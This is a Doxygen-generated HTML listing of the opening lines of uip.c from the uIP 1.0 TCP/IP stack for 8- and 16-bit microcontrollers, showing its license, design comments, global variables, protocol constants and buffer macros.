<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head><meta http-equiv="Content-Type" content="text/html;charset=iso-8859-1">
<title>uIP 1.0: uip/uip.c Source File</title>
<link href="doxygen.css" rel="stylesheet" type="text/css">
<link href="tabs.css" rel="stylesheet" type="text/css">
</head><body>
<!-- Generated by Doxygen 1.4.6 -->
<div class="tabs">
  <ul>
    <li><a href="main.html"><span>Main&nbsp;Page</span></a></li>
    <li><a href="modules.html"><span>Modules</span></a></li>
    <li><a href="classes.html"><span>Data&nbsp;Structures</span></a></li>
    <li id="current"><a href="files.html"><span>Files</span></a></li>
    <li><a href="examples.html"><span>Examples</span></a></li>
  </ul></div>
<div class="tabs">
  <ul>
    <li><a href="files.html"><span>File&nbsp;List</span></a></li>
    <li><a href="globals.html"><span>Globals</span></a></li>
  </ul></div>
<h1>uip/uip.c</h1><a href="a00135.html">Go to the documentation of this file.</a><div class="fragment"><pre class="fragment"><a name="l00001"></a><a class="code" href="a00135.html#534d9e416324fb8ecca6b9cb4b1f6a6a">00001</a> <span class="preprocessor">#define DEBUG_PRINTF(...) </span><span class="comment">/*printf(__VA_ARGS__)*/</span>
<a name="l00002"></a>00002 <span class="comment"></span>
<a name="l00003"></a>00003 <span class="comment">/**</span>
<a name="l00004"></a>00004 <span class="comment"> * \defgroup uip The uIP TCP/IP stack</span>
<a name="l00005"></a>00005 <span class="comment"> * @{</span>
<a name="l00006"></a>00006 <span class="comment"> *</span>
<a name="l00007"></a>00007 <span class="comment"> * uIP is an implementation of the TCP/IP protocol stack intended for</span>
<a name="l00008"></a>00008 <span class="comment"> * small 8-bit and 16-bit microcontrollers.</span>
<a name="l00009"></a>00009 <span class="comment"> *</span>
<a name="l00010"></a>00010 <span class="comment"> * uIP provides the necessary protocols for Internet communication,</span>
<a name="l00011"></a>00011 <span class="comment"> * with a very small code footprint and RAM requirements - the uIP</span>
<a name="l00012"></a>00012 <span class="comment"> * code size is on the order of a few kilobytes and RAM usage is on</span>
<a name="l00013"></a>00013 <span class="comment"> * the order of a few hundred bytes.</span>
<a name="l00014"></a>00014 <span class="comment"> */</span>
<a name="l00015"></a>00015 <span class="comment"></span>
<a name="l00016"></a>00016 <span class="comment">/**</span>
<a name="l00017"></a>00017 <span class="comment"> * \file</span>
<a name="l00018"></a>00018 <span class="comment"> * The uIP TCP/IP stack code.</span>
<a name="l00019"></a>00019 <span class="comment"> * \author Adam Dunkels &lt;adam@dunkels.com&gt;</span>
<a name="l00020"></a>00020 <span class="comment"> */</span>
<a name="l00021"></a>00021 
<a name="l00022"></a>00022 <span class="comment">/*</span>
<a name="l00023"></a>00023 <span class="comment"> * Copyright (c) 2001-2003, Adam Dunkels.</span>
<a name="l00024"></a>00024 <span class="comment"> * All rights reserved.</span>
<a name="l00025"></a>00025 <span class="comment"> *</span>
<a name="l00026"></a>00026 <span class="comment"> * Redistribution and use in source and binary forms, with or without</span>
<a name="l00027"></a>00027 <span class="comment"> * modification, are permitted provided that the following conditions</span>
<a name="l00028"></a>00028 <span class="comment"> * are met:</span>
<a name="l00029"></a>00029 <span class="comment"> * 1. Redistributions of source code must retain the above copyright</span>
<a name="l00030"></a>00030 <span class="comment"> *    notice, this list of conditions and the following disclaimer.</span>
<a name="l00031"></a>00031 <span class="comment"> * 2. Redistributions in binary form must reproduce the above copyright</span>
<a name="l00032"></a>00032 <span class="comment"> *    notice, this list of conditions and the following disclaimer in the</span>
<a name="l00033"></a>00033 <span class="comment"> *    documentation and/or other materials provided with the distribution.</span>
<a name="l00034"></a>00034 <span class="comment"> * 3. The name of the author may not be used to endorse or promote</span>
<a name="l00035"></a>00035 <span class="comment"> *    products derived from this software without specific prior</span>
<a name="l00036"></a>00036 <span class="comment"> *    written permission.</span>
<a name="l00037"></a>00037 <span class="comment"> *</span>
<a name="l00038"></a>00038 <span class="comment"> * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS</span>
<a name="l00039"></a>00039 <span class="comment"> * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED</span>
<a name="l00040"></a>00040 <span class="comment"> * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE</span>
<a name="l00041"></a>00041 <span class="comment"> * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY</span>
<a name="l00042"></a>00042 <span class="comment"> * DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL</span>
<a name="l00043"></a>00043 <span class="comment"> * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE</span>
<a name="l00044"></a>00044 <span class="comment"> * GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS</span>
<a name="l00045"></a>00045 <span class="comment"> * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,</span>
<a name="l00046"></a>00046 <span class="comment"> * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING</span>
<a name="l00047"></a>00047 <span class="comment"> * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS</span>
<a name="l00048"></a>00048 <span class="comment"> * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span>
<a name="l00049"></a>00049 <span class="comment"> *</span>
<a name="l00050"></a>00050 <span class="comment"> * This file is part of the uIP TCP/IP stack.</span>
<a name="l00051"></a>00051 <span class="comment"> *</span>
<a name="l00052"></a>00052 <span class="comment"> * $Id: uip.c,v 1.65 2006/06/11 21:46:39 adam Exp $</span>
<a name="l00053"></a>00053 <span class="comment"> *</span>
<a name="l00054"></a>00054 <span class="comment"> */</span>
<a name="l00055"></a>00055 
<a name="l00056"></a>00056 <span class="comment">/*</span>
<a name="l00057"></a>00057 <span class="comment"> * uIP is a small implementation of the IP, UDP and TCP protocols (as</span>
<a name="l00058"></a>00058 <span class="comment"> * well as some basic ICMP stuff). The implementation couples the IP,</span>
<a name="l00059"></a>00059 <span class="comment"> * UDP, TCP and the application layers very tightly. To keep the size</span>
<a name="l00060"></a>00060 <span class="comment"> * of the compiled code down, this code frequently uses the goto</span>
<a name="l00061"></a>00061 <span class="comment"> * statement. While it would be possible to break the uip_process()</span>
<a name="l00062"></a>00062 <span class="comment"> * function into many smaller functions, this would increase the code</span>
<a name="l00063"></a>00063 <span class="comment"> * size because of the overhead of parameter passing and the fact that</span>
<a name="l00064"></a>00064 <span class="comment"> * the optimier would not be as efficient.</span>
<a name="l00065"></a>00065 <span class="comment"> *</span>
<a name="l00066"></a>00066 <span class="comment"> * The principle is that we have a small buffer, called the uip_buf,</span>
<a name="l00067"></a>00067 <span class="comment"> * in which the device driver puts an incoming packet. The TCP/IP</span>
<a name="l00068"></a>00068 <span class="comment"> * stack parses the headers in the packet, and calls the</span>
<a name="l00069"></a>00069 <span class="comment"> * application. If the remote host has sent data to the application,</span>
<a name="l00070"></a>00070 <span class="comment"> * this data is present in the uip_buf and the application read the</span>
<a name="l00071"></a>00071 <span class="comment"> * data from there. It is up to the application to put this data into</span>
<a name="l00072"></a>00072 <span class="comment"> * a byte stream if needed. The application will not be fed with data</span>
<a name="l00073"></a>00073 <span class="comment"> * that is out of sequence.</span>
<a name="l00074"></a>00074 <span class="comment"> *</span>
<a name="l00075"></a>00075 <span class="comment"> * If the application whishes to send data to the peer, it should put</span>
<a name="l00076"></a>00076 <span class="comment"> * its data into the uip_buf. The uip_appdata pointer points to the</span>
<a name="l00077"></a>00077 <span class="comment"> * first available byte. The TCP/IP stack will calculate the</span>
<a name="l00078"></a>00078 <span class="comment"> * checksums, and fill in the necessary header fields and finally send</span>
<a name="l00079"></a>00079 <span class="comment"> * the packet back to the peer.</span>
<a name="l00080"></a>00080 <span class="comment">*/</span>
<a name="l00081"></a>00081 
<a name="l00082"></a>00082 <span class="preprocessor">#include "<a class="code" href="a00136.html">uip.h</a>"</span>
<a name="l00083"></a>00083 <span class="preprocessor">#include "<a class="code" href="a00140.html">uipopt.h</a>"</span>
<a name="l00084"></a>00084 <span class="preprocessor">#include "<a class="code" href="a00137.html">uip_arch.h</a>"</span>
<a name="l00085"></a>00085 
<a name="l00086"></a>00086 <span class="preprocessor">#if UIP_CONF_IPV6</span>
<a name="l00087"></a>00087 <span class="preprocessor"></span><span class="preprocessor">#include "<a class="code" href="a00132.html">uip-neighbor.h</a>"</span>
<a name="l00088"></a>00088 <span class="preprocessor">#endif </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00089"></a>00089 
<a name="l00090"></a>00090 <span class="preprocessor">#include &lt;string.h&gt;</span>
<a name="l00091"></a>00091 
<a name="l00092"></a>00092 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00093"></a>00093 <span class="comment">/* Variable definitions. */</span>
<a name="l00094"></a>00094 
<a name="l00095"></a>00095 
<a name="l00096"></a>00096 <span class="comment">/* The IP address of this host. If it is defined to be fixed (by</span>
<a name="l00097"></a>00097 <span class="comment">   setting UIP_FIXEDADDR to 1 in uipopt.h), the address is set</span>
<a name="l00098"></a>00098 <span class="comment">   here. Otherwise, the address */</span>
<a name="l00099"></a>00099 <span class="preprocessor">#if UIP_FIXEDADDR &gt; 0</span>
<a name="l00100"></a>00100 <span class="preprocessor"></span><span class="keyword">const</span> <a class="code" href="a00150.html#g1ef35301f43a5bbb9f89f07b5a36b9a0">uip_ipaddr_t</a> <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a> =
<a name="l00101"></a>00101   {<a class="code" href="a00148.html#g69a7a4951ff21b302267532c21ee78fc">HTONS</a>((UIP_IPADDR0 &lt;&lt; 8) | UIP_IPADDR1),
<a name="l00102"></a>00102    <a class="code" href="a00148.html#g69a7a4951ff21b302267532c21ee78fc">HTONS</a>((UIP_IPADDR2 &lt;&lt; 8) | UIP_IPADDR3)};
<a name="l00103"></a>00103 <span class="keyword">const</span> <a class="code" href="a00150.html#g1ef35301f43a5bbb9f89f07b5a36b9a0">uip_ipaddr_t</a> <a class="code" href="a00150.html#g20df5c82f2a15a508c19e505b5d9de2b">uip_draddr</a> =
<a name="l00104"></a>00104   {<a class="code" href="a00148.html#g69a7a4951ff21b302267532c21ee78fc">HTONS</a>((UIP_DRIPADDR0 &lt;&lt; 8) | UIP_DRIPADDR1),
<a name="l00105"></a>00105    <a class="code" href="a00148.html#g69a7a4951ff21b302267532c21ee78fc">HTONS</a>((UIP_DRIPADDR2 &lt;&lt; 8) | UIP_DRIPADDR3)};
<a name="l00106"></a>00106 <span class="keyword">const</span> <a class="code" href="a00150.html#g1ef35301f43a5bbb9f89f07b5a36b9a0">uip_ipaddr_t</a> <a class="code" href="a00150.html#g3237be0d9ec457de0177689ee23c0d5c">uip_netmask</a> =
<a name="l00107"></a>00107   {<a class="code" href="a00148.html#g69a7a4951ff21b302267532c21ee78fc">HTONS</a>((UIP_NETMASK0 &lt;&lt; 8) | UIP_NETMASK1),
<a name="l00108"></a>00108    <a class="code" href="a00148.html#g69a7a4951ff21b302267532c21ee78fc">HTONS</a>((UIP_NETMASK2 &lt;&lt; 8) | UIP_NETMASK3)};
<a name="l00109"></a>00109 <span class="preprocessor">#else</span>
<a name="l00110"></a><a class="code" href="a00150.html#g3237be0d9ec457de0177689ee23c0d5c">00110</a> <span class="preprocessor"></span><a class="code" href="a00150.html#g1ef35301f43a5bbb9f89f07b5a36b9a0">uip_ipaddr_t</a> <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>, <a class="code" href="a00150.html#g20df5c82f2a15a508c19e505b5d9de2b">uip_draddr</a>, uip_netmask;
<a name="l00111"></a>00111 <span class="preprocessor">#endif </span><span class="comment">/* UIP_FIXEDADDR */</span>
<a name="l00112"></a>00112 
<a name="l00113"></a>00113 <span class="keyword">static</span> <span class="keyword">const</span> <a class="code" href="a00150.html#g1ef35301f43a5bbb9f89f07b5a36b9a0">uip_ipaddr_t</a> all_ones_addr =
<a name="l00114"></a>00114 <span class="preprocessor">#if UIP_CONF_IPV6</span>
<a name="l00115"></a>00115 <span class="preprocessor"></span>  {0xffff,0xffff,0xffff,0xffff,0xffff,0xffff,0xffff,0xffff};
<a name="l00116"></a>00116 <span class="preprocessor">#else </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00117"></a>00117   {0xffff,0xffff};
<a name="l00118"></a>00118 <span class="preprocessor">#endif </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00119"></a>00119 <span class="keyword">static</span> <span class="keyword">const</span> <a class="code" href="a00150.html#g1ef35301f43a5bbb9f89f07b5a36b9a0">uip_ipaddr_t</a> all_zeroes_addr =
<a name="l00120"></a>00120 <span class="preprocessor">#if UIP_CONF_IPV6</span>
<a name="l00121"></a>00121 <span class="preprocessor"></span>  {0x0000,0x0000,0x0000,0x0000,0x0000,0x0000,0x0000,0x0000};
<a name="l00122"></a>00122 <span class="preprocessor">#else </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00123"></a>00123   {0x0000,0x0000};
<a name="l00124"></a>00124 <span class="preprocessor">#endif </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l00125"></a>00125 
<a name="l00126"></a>00126 
<a name="l00127"></a>00127 <span class="preprocessor">#if UIP_FIXEDETHADDR</span>
<a name="l00128"></a>00128 <span class="preprocessor"></span><span class="keyword">const</span> <span class="keyword">struct </span><a class="code" href="a00089.html">uip_eth_addr</a> <a class="code" href="a00150.html#g499bb98a0b4ae9a98553ede81317606d">uip_ethaddr</a> = {{UIP_ETHADDR0,
<a name="l00129"></a>00129                                           UIP_ETHADDR1,
<a name="l00130"></a>00130                                           UIP_ETHADDR2,
<a name="l00131"></a>00131                                           UIP_ETHADDR3,
<a name="l00132"></a>00132                                           UIP_ETHADDR4,
<a name="l00133"></a>00133                                           UIP_ETHADDR5}};
<a name="l00134"></a>00134 <span class="preprocessor">#else</span>
<a name="l00135"></a><a class="code" href="a00152.html#g499bb98a0b4ae9a98553ede81317606d">00135</a> <span class="preprocessor"></span><span class="keyword">struct </span><a class="code" href="a00089.html">uip_eth_addr</a> <a class="code" href="a00150.html#g499bb98a0b4ae9a98553ede81317606d">uip_ethaddr</a> = {{0,0,0,0,0,0}};
<a name="l00136"></a>00136 <span class="preprocessor">#endif</span>
<a name="l00137"></a>00137 <span class="preprocessor"></span>
<a name="l00138"></a>00138 <span class="preprocessor">#ifndef UIP_CONF_EXTERNAL_BUFFER</span>
<a name="l00139"></a><a class="code" href="a00150.html#gb81e78f890dbbee50c533a9734b74fd9">00139</a> <span class="preprocessor"></span><a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> <a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00153.html#g3589822ecb9d9c4145209756396b8a6b">UIP_BUFSIZE</a> + 2];   <span class="comment">/* The packet buffer that contains</span>
<a name="l00140"></a>00140 <span class="comment">                                    incoming packets. */</span>
<a name="l00141"></a>00141 <span class="preprocessor">#endif </span><span class="comment">/* UIP_CONF_EXTERNAL_BUFFER */</span>
<a name="l00142"></a>00142 
<a name="l00143"></a><a class="code" href="a00150.html#g561b8eda32e059d4e7397f776268cc63">00143</a> <span class="keywordtype">void</span> *<a class="code" href="a00150.html#g561b8eda32e059d4e7397f776268cc63">uip_appdata</a>;               <span class="comment">/* The uip_appdata pointer points to</span>
<a name="l00144"></a>00144 <span class="comment">                                    application data. */</span>
<a name="l00145"></a><a class="code" href="a00150.html#ga05a3dde2048480fa3ab2a5961898d18">00145</a> <span class="keywordtype">void</span> *<a class="code" href="a00150.html#ga05a3dde2048480fa3ab2a5961898d18">uip_sappdata</a>;              <span class="comment">/* The uip_appdata pointer points to</span>
<a name="l00146"></a>00146 <span class="comment">                                    the application data which is to</span>
<a name="l00147"></a>00147 <span class="comment">                                    be sent. */</span>
<a name="l00148"></a>00148 <span class="preprocessor">#if UIP_URGDATA &gt; 0</span>
<a name="l00149"></a>00149 <span class="preprocessor"></span><span class="keywordtype">void</span> *uip_urgdata;               <span class="comment">/* The uip_urgdata pointer points to</span>
<a name="l00150"></a>00150 <span class="comment">                                    urgent data (out-of-band data), if</span>
<a name="l00151"></a>00151 <span class="comment">                                    present. */</span>
<a name="l00152"></a>00152 <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> uip_urglen, uip_surglen;
<a name="l00153"></a>00153 <span class="preprocessor">#endif </span><span class="comment">/* UIP_URGDATA &gt; 0 */</span>
<a name="l00154"></a>00154 
<a name="l00155"></a><a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">00155</a> <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a>, <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a>;
<a name="l00156"></a>00156                              <span class="comment">/* The uip_len is either 8 or 16 bits,</span>
<a name="l00157"></a>00157 <span class="comment">                                depending on the maximum packet</span>
<a name="l00158"></a>00158 <span class="comment">                                size. */</span>
<a name="l00159"></a>00159 
<a name="l00160"></a><a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">00160</a> <a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a>;     <span class="comment">/* The uip_flags variable is used for</span>
<a name="l00161"></a>00161 <span class="comment">                                communication between the TCP/IP stack</span>
<a name="l00162"></a>00162 <span class="comment">                                and the application program. */</span>
<a name="l00163"></a><a class="code" href="a00150.html#g788ffac72342f6172343d7f8099cbe1a">00163</a> <span class="keyword">struct </span><a class="code" href="a00088.html">uip_conn</a> *<a class="code" href="a00088.html">uip_conn</a>;   <span class="comment">/* uip_conn always points to the current</span>
<a name="l00164"></a>00164 <span class="comment">                                connection. */</span>
<a name="l00165"></a>00165 
<a name="l00166"></a><a class="code" href="a00150.html#gf703683056d2bfa5c81fa157dcb20fe2">00166</a> <span class="keyword">struct </span><a class="code" href="a00150.html#g788ffac72342f6172343d7f8099cbe1a">uip_conn</a> <a class="code" href="a00150.html#gf703683056d2bfa5c81fa157dcb20fe2">uip_conns</a>[<a class="code" href="a00153.html#gf5fe83be78b78b9e7d9e7f1e34ab1cc5">UIP_CONNS</a>];
<a name="l00167"></a>00167                              <span class="comment">/* The uip_conns array holds all TCP</span>
<a name="l00168"></a>00168 <span class="comment">                                connections. */</span>
<a name="l00169"></a><a class="code" href="a00150.html#g236d5c7872f59c8fe7b701c7252b976e">00169</a> <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> <a class="code" href="a00150.html#g236d5c7872f59c8fe7b701c7252b976e">uip_listenports</a>[<a class="code" href="a00153.html#g8f4ebd8ef6c0ea665ed351d87fec09fd">UIP_LISTENPORTS</a>];
<a name="l00170"></a>00170                              <span class="comment">/* The uip_listenports list all currently</span>
<a name="l00171"></a>00171 <span class="comment">                                listning ports. */</span>
<a name="l00172"></a>00172 <span class="preprocessor">#if UIP_UDP</span>
<a name="l00173"></a><a class="code" href="a00150.html#g210f227119fc972e6222c9cb452e15a9">00173</a> <span class="preprocessor"></span><span class="keyword">struct </span><a class="code" href="a00095.html">uip_udp_conn</a> *<a class="code" href="a00095.html">uip_udp_conn</a>;
<a name="l00174"></a><a class="code" href="a00150.html#geb533744817cf6695d75293369c2248b">00174</a> <span class="keyword">struct </span><a class="code" href="a00150.html#g210f227119fc972e6222c9cb452e15a9">uip_udp_conn</a> <a class="code" href="a00150.html#geb533744817cf6695d75293369c2248b">uip_udp_conns</a>[<a class="code" href="a00153.html#g196379ceb1219a99f4495e41ccc9bbfb">UIP_UDP_CONNS</a>];
<a name="l00175"></a>00175 <span class="preprocessor">#endif </span><span class="comment">/* UIP_UDP */</span>
<a name="l00176"></a>00176 
<a name="l00177"></a>00177 <span class="keyword">static</span> <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> ipid;           <span class="comment">/* Ths ipid variable is an increasing</span>
<a name="l00178"></a>00178 <span class="comment">                                number that is used for the IP ID</span>
<a name="l00179"></a>00179 <span class="comment">                                field. */</span>
<a name="l00180"></a>00180 
<a name="l00181"></a><a class="code" href="a00150.html#g22f140b02c354dfebcc7ad481c3bcd68">00181</a> <span class="keywordtype">void</span> <a class="code" href="a00145.html#g22f140b02c354dfebcc7ad481c3bcd68">uip_setipid</a>(<a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> <span class="keywordtype">id</span>) { ipid = id; }
<a name="l00182"></a>00182 
<a name="l00183"></a>00183 <span class="keyword">static</span> <a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> iss[4];          <span class="comment">/* The iss variable is used for the TCP</span>
<a name="l00184"></a>00184 <span class="comment">                                initial sequence number. */</span>
<a name="l00185"></a>00185 
<a name="l00186"></a>00186 <span class="preprocessor">#if UIP_ACTIVE_OPEN</span>
<a name="l00187"></a>00187 <span class="preprocessor"></span><span class="keyword">static</span> <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> lastport;       <span class="comment">/* Keeps track of the last port used for</span>
<a name="l00188"></a>00188 <span class="comment">                                a new connection. */</span>
<a name="l00189"></a>00189 <span class="preprocessor">#endif </span><span class="comment">/* UIP_ACTIVE_OPEN */</span>
<a name="l00190"></a>00190 
<a name="l00191"></a>00191 <span class="comment">/* Temporary variables. */</span>
<a name="l00192"></a><a class="code" href="a00150.html#g2a0cf5d86c58fab216414ce59bf1fea1">00192</a> <a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> <a class="code" href="a00151.html#g2a0cf5d86c58fab216414ce59bf1fea1">uip_acc32</a>[4];
<a name="l00193"></a>00193 <span class="keyword">static</span> <a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> c, opt;
<a name="l00194"></a>00194 <span class="keyword">static</span> <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> tmp16;
<a name="l00195"></a>00195 
<a name="l00196"></a>00196 <span class="comment">/* Structures and definitions. */</span>
<a name="l00197"></a><a class="code" href="a00150.html#g88e60aa2cf23e1c65d630701db08c743">00197</a> <span class="preprocessor">#define TCP_FIN 0x01</span>
<a name="l00198"></a><a class="code" href="a00150.html#g6020613f5062417d9811cfa837215c83">00198</a> <span class="preprocessor"></span><span class="preprocessor">#define TCP_SYN 0x02</span>
<a name="l00199"></a><a class="code" href="a00150.html#g5ca559def464ef20d8b1f7d32f2f160d">00199</a> <span class="preprocessor"></span><span class="preprocessor">#define TCP_RST 0x04</span>
<a name="l00200"></a><a class="code" href="a00150.html#g1320fd0006a2f70138bc2d0018dda829">00200</a> <span class="preprocessor"></span><span class="preprocessor">#define TCP_PSH 0x08</span>
<a name="l00201"></a><a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">00201</a> <span class="preprocessor"></span><span class="preprocessor">#define TCP_ACK 0x10</span>
<a name="l00202"></a><a class="code" href="a00150.html#gc84f499cba8a02fc0e306c10b2acabf0">00202</a> <span class="preprocessor"></span><span class="preprocessor">#define TCP_URG 0x20</span>
<a name="l00203"></a><a class="code" href="a00150.html#g1425d4a0c2760adb653a04c0fb137a8d">00203</a> <span class="preprocessor"></span><span class="preprocessor">#define TCP_CTL 0x3f</span>
<a name="l00204"></a>00204 <span class="preprocessor"></span>
<a name="l00205"></a><a class="code" href="a00150.html#g1215163245304bad20d6c5608ad75ab7">00205</a> <span class="preprocessor">#define TCP_OPT_END     0   </span><span class="comment">/* End of TCP options list */</span>
<a name="l00206"></a><a class="code" href="a00150.html#g9f1822e1d231235edacad691f3cb7bbb">00206</a> <span class="preprocessor">#define TCP_OPT_NOOP    1   </span><span class="comment">/* "No-operation" TCP option */</span>
<a name="l00207"></a><a class="code" href="a00150.html#g691688604655ea8943d15f14c60027d8">00207</a> <span class="preprocessor">#define TCP_OPT_MSS     2   </span><span class="comment">/* Maximum segment size TCP option */</span>
<a name="l00208"></a>00208 
<a name="l00209"></a><a class="code" href="a00150.html#g12f3bf821224b8e7b48a57ed3cea15cf">00209</a> <span class="preprocessor">#define TCP_OPT_MSS_LEN 4   </span><span class="comment">/* Length of TCP MSS option. */</span>
<a name="l00210"></a>00210 
<a name="l00211"></a><a class="code" href="a00150.html#g5c5b1834e497f53ad0ef947bbe9777fa">00211</a> <span class="preprocessor">#define ICMP_ECHO_REPLY 0</span>
<a name="l00212"></a><a class="code" href="a00150.html#gd58231410d58e34b455328b888a9e73c">00212</a> <span class="preprocessor"></span><span class="preprocessor">#define ICMP_ECHO       8</span>
<a name="l00213"></a>00213 <span class="preprocessor"></span>
<a name="l00214"></a><a class="code" href="a00150.html#g207d17b633cd095120a74bc1f2257b17">00214</a> <span class="preprocessor">#define ICMP6_ECHO_REPLY             129</span>
<a name="l00215"></a><a class="code" href="a00150.html#g4cc3e223b63f27b546d62e9a258dba5a">00215</a> <span class="preprocessor"></span><span class="preprocessor">#define ICMP6_ECHO                   128</span>
<a name="l00216"></a><a class="code" href="a00150.html#g1cea57e3ea526f210b1068e6dcf7b4f4">00216</a> <span class="preprocessor"></span><span class="preprocessor">#define ICMP6_NEIGHBOR_SOLICITATION  135</span>
<a name="l00217"></a><a class="code" href="a00150.html#g62c03e0a308cc23929a80fe8d8f9dc1e">00217</a> <span class="preprocessor"></span><span class="preprocessor">#define ICMP6_NEIGHBOR_ADVERTISEMENT 136</span>
<a name="l00218"></a>00218 <span class="preprocessor"></span>
<a name="l00219"></a><a class="code" href="a00150.html#g1d3211dbbdfb22d6a47b60dddcf945e8">00219</a> <span class="preprocessor">#define ICMP6_FLAG_S (1 &lt;&lt; 6)</span>
<a name="l00220"></a>00220 <span class="preprocessor"></span>
<a name="l00221"></a><a class="code" href="a00150.html#g42288d5c3cf4b10becefec657f441e54">00221</a> <span class="preprocessor">#define ICMP6_OPTION_SOURCE_LINK_ADDRESS 1</span>
<a name="l00222"></a><a class="code" href="a00150.html#g8387881de3a8bfd3c0d57b9d04ac9b7e">00222</a> <span class="preprocessor"></span><span class="preprocessor">#define ICMP6_OPTION_TARGET_LINK_ADDRESS 2</span>
<a name="l00223"></a>00223 <span class="preprocessor"></span>
<a name="l00224"></a>00224 
<a name="l00225"></a>00225 <span class="comment">/* Macros. */</span>
<a name="l00226"></a><a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">00226</a> <span class="preprocessor">#define BUF ((struct uip_tcpip_hdr *)&amp;uip_buf[UIP_LLH_LEN])</span>
<a name="l00227"></a><a class="code" href="a00150.html#g96544dedc1cdc71ad2ad54bf1d5e5433">00227</a> <span class="preprocessor"></span><span class="preprocessor">#define FBUF ((struct uip_tcpip_hdr *)&amp;uip_reassbuf[0])</span>
<a name="l00228"></a><a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">00228</a> <span class="preprocessor"></span><span class="preprocessor">#define ICMPBUF ((struct uip_icmpip_hdr *)&amp;uip_buf[UIP_LLH_LEN])</span>
<a name="l00229"></a><a class="code" href="a00150.html#gb9435261753469accec0c9bf8a5a2686">00229</a> <span class="preprocessor"></span><span class="preprocessor">#define UDPBUF ((struct uip_udpip_hdr *)&amp;uip_buf[UIP_LLH_LEN])</span>
<a name="l00230"></a>00230 <span class="preprocessor"></span>
<a name="l00231"></a>00231 
<a name="l00232"></a>00232 <span class="preprocessor">#if UIP_STATISTICS == 1</span>
<a name="l00233"></a>00233 <span class="preprocessor"></span><span class="keyword">struct </span><a class="code" href="a00093.html">uip_stats</a> <a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>;
<a name="l00234"></a>00234 <span class="preprocessor">#define UIP_STAT(s) s</span>
<a name="l00235"></a>00235 <span class="preprocessor"></span><span class="preprocessor">#else</span>
<a name="l00236"></a><a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">00236</a> <span class="preprocessor"></span><span class="preprocessor">#define UIP_STAT(s)</span>
<a name="l00237"></a>00237 <span class="preprocessor"></span><span class="preprocessor">#endif </span><span class="comment">/* UIP_STATISTICS == 1 */</span>
<a name="l00238"></a>00238 
<a name="l00239"></a>00239 <span class="preprocessor">#if UIP_LOGGING == 1</span>
<a name="l00240"></a>00240 <span class="preprocessor"></span><span class="preprocessor">#include &lt;stdio.h&gt;</span>
<a name="l00241"></a>00241 <span class="keywordtype">void</span> <a class="code" href="a00153.html#gb58e1ceb7cb73ca2bcd73146b6c1b4e7">uip_log</a>(<span class="keywordtype">char</span> *msg);
<a name="l00242"></a>00242 <span class="preprocessor">#define UIP_LOG(m) uip_log(m)</span>
<a name="l00243"></a>00243 <span class="preprocessor"></span><span class="preprocessor">#else</span>
<a name="l00244"></a><a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">00244</a> <span class="preprocessor"></span><span class="preprocessor">#define UIP_LOG(m)</span>
<a name="l00245"></a>00245 <span class="preprocessor"></span><span class="preprocessor">#endif </span><span class="comment">/* UIP_LOGGING == 1 */</span>
<a name="l00246"></a>00246 
<a name="l00247"></a>00247 <span class="preprocessor">#if ! UIP_ARCH_ADD32</span>
<a name="l00248"></a>00248 <span class="preprocessor"></span><span class="keywordtype">void</span>
